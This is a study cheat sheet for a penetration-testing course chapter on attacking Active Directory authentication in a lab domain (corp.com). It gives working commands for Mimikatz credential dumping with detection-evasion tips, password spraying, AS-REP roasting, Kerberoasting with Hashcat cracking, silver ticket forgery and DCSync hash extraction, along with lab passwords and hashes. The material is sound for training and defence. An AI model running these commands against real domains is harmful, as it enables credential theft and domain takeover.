# Attacking Active Directory Authentication Cheat Sheet (PEN-200, Ch. 23)

Builds on AD enumeration (users, groups, SPNs) from the previous Module. Target lab domain used throughout: **corp.com**. Two Learning Units: (1) understand NTLM/Kerberos auth + where creds are cached, (2) perform attacks against those mechanisms.

---

## 23.1 Understanding Active Directory Authentication

### 23.1.1 NTLM authentication

NTLM authentication is used when:
- A client authenticates to a server **by IP address** instead of hostname, or
- The client authenticates to a hostname **not registered** in AD-integrated DNS, or
- A third-party application chooses NTLM over Kerberos.

NTLM is a challenge-response protocol — the client starts authentication directly with the **application server** (not a domain controller).

> NTLM hashes cannot be reversed, but NTLM is a **fast** hash algorithm. With modern GPUs, Hashcat can test **600+ billion NTLM hashes/sec** — an 8-character password can be cracked in ~2.5 hours, a 9-character password in ~11 days.

> Even given its weaknesses, fully disabling NTLM domain-wide is impractical — it remains an important fallback mechanism relied on by many third-party apps. Expect to find it enabled in most assessments.

### 23.1.2 Kerberos authentication

Microsoft's Kerberos is adapted from MIT Kerberos v5; it's been the default AD auth protocol since Windows Server 2003. Unlike NTLM, Kerberos client auth is a **ticket system** brokered by a **Key Distribution Center (KDC)** service running on every domain controller — the client talks to the KDC first, not the application server.

**Full authentication flow:**

1. **AS-REQ** — client sends an Authentication Server Request to the KDC (encrypted timestamp using the user's password hash).
2. DC looks up the user's password hash in `ntds.dit`, decrypts the timestamp. If successful and not a duplicate, auth succeeds.
   > A duplicate timestamp can indicate a **replay attack**.
3. **AS-REP** — DC replies with a session key + **Ticket Granting Ticket (TGT)**. The session key is encrypted with the user's password hash (client can decrypt/reuse it); the TGT itself is encrypted with the **krbtgt account's NTLM hash** (only the KDC can decrypt it) and contains user/domain/timestamp/client IP/session key.
   - TGT default lifetime: **10 hours**, renewed silently afterward (no re-entry of password).
4. To access a resource, the client builds a **TGS-REQ** (current user + timestamp encrypted with session key, resource name, the encrypted TGT) and sends it to the KDC's ticket-granting service.
5. KDC decrypts the TGT with its secret key, extracts the session key, decrypts username/timestamp, then validates:
   1. TGT has a valid timestamp.
   2. Username in TGS-REQ matches username in TGT.
   3. Client IP matches the TGT's IP.
6. **TGS-REP** — KDC replies with a **service ticket** (encrypted with the target SPN's account password hash) plus a session key for the client-service leg.
7. Client sends the app server an **AP-REQ** (username + timestamp encrypted with the service-ticket session key, plus the service ticket). The app server decrypts the ticket with its own account's password hash, extracts username/session key, validates the AP-REQ, checks group memberships embedded in the ticket, and grants access.

This is intentionally convoluted — designed to mitigate network attacks and prevent fake-credential use.

### 23.1.3 Cached AD credentials

Because Kerberos SSO requires renewing TGTs without re-prompting for a password, Windows caches password hashes and tickets in **LSASS** (Local Security Authority Subsystem Service) memory.

> Mimikatz is the most popular extraction tool, but running it as a **standalone binary is heavily signature-detected**. Prefer executing it reflectively from memory via an injector (e.g. PowerShell), or dump the whole LSASS process via Task Manager, move the dump to a helper machine, and load it into Mimikatz offline. (Full evasion techniques are covered in PEN-300.)

```powershell
# Connect to a box where the target user has a session, with local admin rights
kali@kali:~$ xfreerdp /cert-ignore /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.50.75

# From an elevated PowerShell prompt:
PS C:\Tools\> .\mimikatz.exe

mimikatz # privilege::debug            # enable SeDebugPrivilege
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords    # dump creds of all logged-on users
mimikatz # sekurlsa::tickets           # dump cached Kerberos TGTs / service tickets in LSASS
```

`sekurlsa::logonpasswords` output shows, per logged-on user: **NTLM**, **SHA1** (paired with AES on functional levels ≥ Windows Server 2008), **DPAPI**, and (if WDigest is enabled, common on older/legacy-configured systems) the **cleartext password**.

> Defensive countermeasure: **LSA Protection** (a registry key) prevents reading LSASS process memory, blocking these extraction techniques. Bypasses are covered in PEN-300.

Mimikatz can also touch **AD CS** cached certificates: `crypto::capi` (patch CryptoAPI) or `crypto::cng` (patch KeyIso service) can make a certificate's **non-exportable private key** exportable anyway.

---

## 23.2 Performing Attacks on Active Directory Authentication

Covers: password attacks, abusing user account options, abusing Kerberos SPN auth (Kerberoasting), forging service tickets (silver tickets), and impersonating a DC (DCSync). Techniques are shown for both Kali and Windows where possible.

### 23.2.1 Password attacks (password spraying)

First check the account lockout policy so spraying doesn't lock out real users:

```powershell
PS C:\Users\jeff> net accounts
...
Lockout threshold:                 5
Lockout duration (minutes):        30
Lockout observation window (min):  30
```

With threshold 5 / observation window 30 min, you can safely attempt **4 logins per 30 minutes per user** → up to **192 attempts/user/24h** without triggering lockout.

**Three password-spraying techniques, in increasing order of stealth/reliability:**

**1. LDAP/ADSI via `DirectoryEntry` (PowerShell)** — low-and-slow, per-user auth check. Constructing a `DirectoryEntry` object with credentials succeeds (object created) if valid, throws `"The user name or password is incorrect"` if not.

```powershell
$SearchString = "LDAP://"
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!")
```
(First few lines reconstructed from a watermark-corrupted OCR page — logic/flow confirmed by surrounding text and later exact lines.)

This is implemented as a ready-made script on the lab Windows box:

```powershell
PS C:\Tools> .\Spray-Passwords.ps1 -Pass Nexus123! -Admin
# -Pass <single password>  |  -File <wordlist>  |  -Admin (only test admin accounts)
# auto-identifies domain users and sprays respecting the lockout policy
```

**2. SMB-based spraying** — traditional approach; noisy and slow because a **full SMB connection** is set up/torn down per attempt.

```bash
kali@kali:~$ crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
SMB 192.168.50.75 445 CLIENT75  [-] corp.com\dave:Nexus123! STATUS_LOGON_FAILURE
SMB 192.168.50.75 445 CLIENT75  [+] corp.com\jen:Nexus123!
SMB 192.168.50.75 445 CLIENT75  [+] corp.com\pete:Nexus123!
```
`-u`/`-p` accept a file or single value; `-d` = domain; `--continue-on-success` keeps spraying past the first hit. Output prefixes `[+]`/`[-]` = valid/invalid credential.

```bash
# Once valid creds are known, reuse them to check local admin rights:
kali@kali:~$ crackmapexec smb 192.168.50.75 -u dave -p Flowers1 -d corp.com
SMB 192.168.50.75 445 CLIENT75  [+] corp.com\dave:Flowers1 (Pwn3d!)
```
`(Pwn3d!)` = the account has **administrative privileges** on that target — a fast way to gauge access level without further enumeration.

> `crackmapexec` doesn't inherently respect the domain's account lockout policy — be cautious with number of attempts / timing when spraying this way.

**3. Kerberos TGT-based spraying** — send only an **AS-REQ** and check for a valid AS-REP; just **2 UDP frames** per check, so it's the fastest/quietest of the three. `kinit` (Linux) or the cross-platform **kerbrute**:

```powershell
PS C:\Tools> .\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
```
> If you get a network error running kerbrute on Windows, verify `usernames.txt` is saved in **ANSI** encoding (use Notepad's Save As).

To get a full username list for spraying, reuse AD enumeration techniques (previous Module) or the built-in user-enumeration functions of crackmapexec/kerbrute.

---

### 23.2.2 AS-REP roasting

Kerberos pre-authentication (the AS-REQ/AS-REP timestamp exchange) exists specifically to **prevent offline password guessing**. If the AD user-account option **"Do not require Kerberos preauthentication"** is enabled (disabled by default, but some apps/legacy tech require it), an attacker can request an AS-REP for that user **without knowing their password**, then crack the encrypted portion of the AS-REP offline.

**Linux — impacket-GetNPUsers:**
```bash
kali@kali:~$ impacket-GetNPUsers -request -outputfile hashes.asreproast -dc-ip 192.168.50.70 corp.com/pete
# prompts for pete's password (Nexus123!)
# -request      = actually request+dump the AS-REP hash (Hashcat format)
# -outputfile   = save cracked-hash-ready output
# -dc-ip        = DC IP address
```
Output flags accounts with UAC value `0x410200` (DONT_REQUIRE_PREAUTH set) as vulnerable.

> Run `impacket-GetNPUsers` **without** `-request`/`-outputfile` to just enumerate which accounts have the option set, with no cracking attempt.

**Cracking with Hashcat** — find the right mode first:
```bash
kali@kali:~$ hashcat --help | grep -i "Kerberos"
```

| Mode | Kerberos hash type |
|---|---|
| 7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth |
| 13100 | Kerberos 5, etype 23, TGS-REP (**Kerberoast**) |
| 18200 | Kerberos 5, etype 23, AS-REP (**AS-REP roast**) |
| 19600 / 19700 | Kerberos 5, etype 17/18, TGS-REP |
| 19800 / 19900 | Kerberos 5, etype 17/18, Pre-Auth |

```bash
kali@kali:~$ sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule --force
# ... $krb5asrep$23$dave@CORP.COM:<hash>:Flowers1
```

> If Hashcat errors with "Not enough allocatable device memory for this attack" inside a Kali VM, make sure the VM has enough VRAM allocated for the GPU passthrough.

**Windows — Rubeus:**
```powershell
PS C:\Tools> .\Rubeus.exe asreproast /nowrap
# /nowrap prevents line-wrapping of the AS-REP hash, making it easy to copy
```
Rubeus queries LDAP for accounts with `userAccountControl` bit `4194304` (DONT_REQUIRE_PREAUTH) set, prints the `$krb5asrep$...` hash directly — copy it to a file and crack with the same `hashcat -m 18200` command.

> To enumerate vulnerable accounts on Windows without Rubeus: **PowerView**'s `Get-DomainUser -PreauthNotRequired`.

**Targeted AS-REP roasting:** if no accounts are natively vulnerable but you have **GenericWrite/GenericAll** on some other AD user object, you can *modify that user's UAC value* to set "Do not require Kerberos preauthentication" yourself (instead of resetting their password, which would lock them out and tip them off), then AS-REP roast and crack it.

> After obtaining the hash, **reset the UAC flag back** on the targeted account — leaving it set introduces a real vulnerability into the client's environment.

---

### 23.2.3 Kerberoasting

When a client requests a **TGS** for an SPN, the KDC performs **no authorization check** at request time — any authenticated domain user can request a service ticket for *any* SPN. Authorization is only checked later, when connecting to the service itself. The TGS (specifically its encrypted portion) is encrypted with the **target SPN account's password hash** — so we can request it, then crack it offline to recover the SPN account's plaintext password.

**Windows — Rubeus:**
```powershell
PS C:\Tools> .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# [*] NOTICE: AES hashes returned for AES-enabled accounts by default.
# [*] Use /ticket:X or /tgtdeleg to force RC4_HMAC for those accounts instead.
```
Rubeus's LDAP filter (visible in its output) targets: `samAccountType=805306368` (user objects) AND `servicePrincipalName=*` AND NOT `krbtgt` AND NOT disabled (UAC bit 2).

**Cracking (mode 13100 = Kerberos 5, etype 23, TGS-REP):**
```bash
kali@kali:~$ sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule --force
# ... $krb5tgs$23$*iis_service$corp.com$HTTP/web04.corp.com:80@corp.com*<hash>:Strawberry1
```

**Linux — impacket-GetUserSPNs:**
```bash
kali@kali:~$ sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
# prompts for pete's password; -request outputs Hashcat-ready $krb5tgs$ hashes for every SPN found
```
> If you receive a `KRB_AP_ERR_SKEW` (clock skew) error, sync your Kali clock to the DC with `ntpdate` or `rdate` first.

> Kerberoasting is only practically useful against SPNs run by **user accounts** with weak passwords. SPNs running under a **computer account**, **(g)MSA**, or the **krbtgt** account get a randomly-generated, complex, **120-character** password — effectively uncrackable.

**Targeted Kerberoasting:** with **GenericWrite/GenericAll** on a user object, you can *set an SPN on that user* yourself, request+crack its TGS, then delete the SPN afterward.

> Delete the SPN once you've captured the hash — leaving an SPN configured on a normal user account is itself a lingering weakness in the client's environment.

---

### 23.2.4 Silver tickets

**PAC (Privileged Account Certificate) validation** — an optional check where the service app verifies the client's identity/privileges with the DC — is **rarely implemented** by service applications. In its absence, a service blindly trusts the group-membership data embedded in a service ticket, because that ticket is "supposed to" only be forgeable by someone who knows the SPN's password hash.

If you obtain an SPN's password (or NTLM hash), you can forge your own service ticket — a **silver ticket** — to access that SPN's resource as **any user, with any group memberships you choose**, without touching a domain controller or needing Domain Admin rights. If the same SPN backs multiple servers, one silver ticket works against all of them.

**Three things needed:**
- SPN account's password hash (NTLM)
- Domain SID
- Target SPN

```powershell
# Confirm current access is denied first:
PS C:\Users\jeff> iwr -UseDefaultCredentials http://web04    # 401 Unauthorized

# As local admin on a box where the SPN account (iis_service) has a session:
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
#   User Name: iis_service   NTLM: 4d28cf5252d39971419580a51484ca09

# Get the domain SID (strip the trailing -<RID>, e.g. drop "-1109"):
PS C:\Users\jeff> whoami /user
# SID: S-1-5-21-1987370270-658905905-1781884369-1105  ->  domain SID = S-1-5-21-1987370270-658905905-1781884369

# Forge and inject the silver ticket:
mimikatz # kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt \
  /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
```

Flags: `/sid` domain SID, `/domain`, `/target` server hosting the SPN, `/service` SPN protocol (e.g. `http`, `cifs`, `ldap`), `/rc4` NTLM hash of the SPN account, `/ptt` = **pass the ticket** (inject directly into current logon session), `/user` = any domain username to embed in the ticket (can be arbitrary — pre-patch). Mimikatz also lets you set arbitrary group RIDs (`Groups Id`) in the forged ticket — e.g. `513 512 520 518 519` includes **Domain Admins (512)**.

> `kerberos::golden` is used for **both** silver and golden tickets — the difference is whose hash you supply: an SPN account's hash = silver ticket (access to that one service); the **krbtgt** account's hash = golden ticket (domain-wide TGT forgery, covered in the Lateral Movement Module).

```powershell
PS C:\Tools> klist                     # confirm the forged ticket is cached in the current session
PS C:\Tools> iwr -UseDefaultCredentials http://web04   # now returns 200 OK as jeffadmin
```

> **Patch note:** Microsoft added PAC field `PAC_REQUESTOR` validation (enforced since **Oct 11, 2022**) — the DC now checks that the `/user:` you specify actually exists in the domain, when client and KDC share a domain. Before this patch, silver tickets could be forged for **non-existent** users too.

Since forging requires the SPN's password hash, this technique is most useful in **later phases** of an assessment where privileged access has already been achieved to extract that hash.

---

### 23.2.5 Domain controller synchronization (DCSync)

Multi-DC domains replicate directory data via the **Directory Replication Service (DRS) Remote Protocol**, using the `IDL_DRSGetNCChanges` API for a DC to request updates for a given object (e.g. an account).

Critically, a DC receiving such a request **doesn't verify the requester is actually a known DC** — it only checks that the requesting SID holds the required replication rights (**Replicating Directory Changes**, **Replicating Directory Changes All**, **Replicating Directory Changes In Filtered Set** — by default granted to Domain Admins, Enterprise Admins, Administrators, and DC computer accounts, but sometimes mis-delegated to other principals via ACLs).

If you control an account with those rights, you can impersonate a DC and pull **any domain user's password hash — including krbtgt or a Domain Admin** — without ever touching LSASS on a real DC.

**Windows — Mimikatz:**
```powershell
mimikatz # lsadump::dcsync /user:corp\dave
# ...
# Hash NTLM: 08d7a47a6f9f66b97b1bae4178747494

mimikatz # lsadump::dcsync /user:corp\Administrator
# Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e
```
Crack the recovered NTLM hash with Hashcat as usual (standard NTLM mode) to get the plaintext password.

**Linux — impacket-secretsdump:**
```bash
kali@kali:~$ impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
# [*] Using the DRSUAPI method to get NTDS.DIT secrets
# dave:1103:aad3b435b51404eeaad3b435b51404ee:08d7a47a6f9f66b97b1bae4178747494:::
```
Format: `domain\uid:rid:lmhash:nthash`. `-just-dc-user <name>` limits the dump to one account (omit for a full NTDS.DIT-equivalent dump). Uses the **DRSUAPI** method — i.e. it's genuinely performing DC replication, not reading a local file.

> This attack requires **no interactive session on a DC at all** — just an account holding the replication rights. Real-world discovery is less about finding a literal Domain Admin and more about finding **misconfigured ACL delegation** that grants "Replicating Directory Changes [All]" to a lower-privileged account.

---

## 23.3 Wrapping Up

NTLM and Kerberos mechanics are the foundation for every attack in this Module — without understanding *how* authentication works, the attacks are just memorized commands that won't adapt to real environments. These techniques (password spraying, AS-REP roasting, Kerberoasting, silver tickets, DCSync) recur throughout an AD-focused assessment to obtain credentials and access, and feed directly into lateral movement (next Module).

---

## Key Takeaways / Workflow Summary

1. **Know the two protocols**: NTLM = challenge-response direct to the app server (used for IP-based auth, unregistered hostnames, legacy apps). Kerberos = ticket-based via a KDC on every DC (AS-REQ/AS-REP → TGT → TGS-REQ/TGS-REP → service ticket → AP-REQ). Kerberos pre-auth exists specifically to stop offline guessing — its absence is what AS-REP roasting exploits.
2. **Cached creds live in LSASS** — Mimikatz (`privilege::debug` + `sekurlsa::logonpasswords`/`::tickets`) is the standard extractor, but avoid running it as a naked standalone binary against defended targets; inject in-memory or dump-and-analyze-offline instead.
3. **Password spraying — pick based on stealth need**: LDAP/ADSI (`DirectoryEntry`, quietest) → SMB (`crackmapexec`, noisiest but shows `Pwn3d!` for local admin) → Kerberos AS-REQ (`kerbrute`, only 2 UDP frames/check). Always check `net accounts` lockout policy first.
4. **AS-REP roasting** (`impacket-GetNPUsers` / `Rubeus.exe asreproast`, Hashcat mode **18200**) targets accounts with "Do not require Kerberos preauth" set — natively or via targeted UAC-bit abuse if you hold GenericWrite/GenericAll.
5. **Kerberoasting** (`impacket-GetUserSPNs` / `Rubeus.exe kerberoast`, Hashcat mode **13100**) targets any SPN's TGS — works well against user-account SPNs with weak passwords, useless against computer/(g)MSA/krbtgt (120-char random secrets). Targeted variant: set your own SPN with GenericWrite/GenericAll, then clean it up.
6. **Silver tickets** (Mimikatz `kerberos::golden` + `/rc4` of an SPN account + `/ptt`) forge access to one service as any user/any group — needs the SPN's hash but no DC contact; patched since Oct 2022 to require the impersonated user to actually exist.
7. **DCSync** (`lsadump::dcsync` / `impacket-secretsdump -just-dc-user`) abuses DRS replication rights to pull any account's hash (including Administrator/krbtgt) with zero LSASS access on a real DC — look for mis-delegated replication ACLs, not just literal Domain Admin membership.
8. **Always clean up** targeted-technique artifacts (reset UAC preauth flags, delete injected SPNs) to avoid leaving new vulnerabilities in the client's environment.
